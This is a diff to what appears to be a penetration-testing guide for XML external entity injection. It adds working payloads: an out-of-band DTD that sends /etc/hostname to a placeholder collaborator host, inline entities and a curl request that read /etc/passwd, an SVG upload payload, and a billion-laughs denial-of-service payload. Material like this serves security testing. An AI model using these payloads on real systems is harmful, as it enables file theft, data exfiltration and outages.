@@ -219,9 +219,53 @@ curl -X POST 'https://app.example.com/api/import' \
 
 **Expected signal (reflected)**: `/etc/passwd` content (e.g., `root:`) in response body, transformed output, or error page.
 
-**Blind OOB**: replace entity with parameter-entity DTD fetch to attacker-controlled host; confirm DNS/HTTP callback correlates to the request timestamp.
+**Blind OOB (parameter entity + external DTD)**
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://YOUR-COLLABORATOR.oast.fun/xxe.dtd"> %xxe;]>
+<root>test</root>
+```
 
-**DoS-only**: billion-laughs payload — expect timeout/500 without file/SSRF content; use only when DoS impact is in scope.
+Host `xxe.dtd` (HTTP) and confirm callback:
+```xml
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-COLLABORATOR.oast.fun/?d=%file;'>">
+%eval;
+%exfil;
+```
+
+**Parameter entity inline (no external DTD file)**
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY % a "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>"> %a;]>
+<root>&xxe;</root>
+```
+
+**Content-Type switch (JSON endpoint → XML)**
+```bash
+curl -X POST 'https://app.example.com/api/data' \
+  -H 'Content-Type: application/xml' \
+  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
+```
+
+**SVG upload**
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
+```
+
+**DoS-only (billion laughs)** — use only when DoS impact is in scope; expect timeout/500:
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+]>
+<root>&lol4;</root>
+```
 
 ## Common False Alarms
 
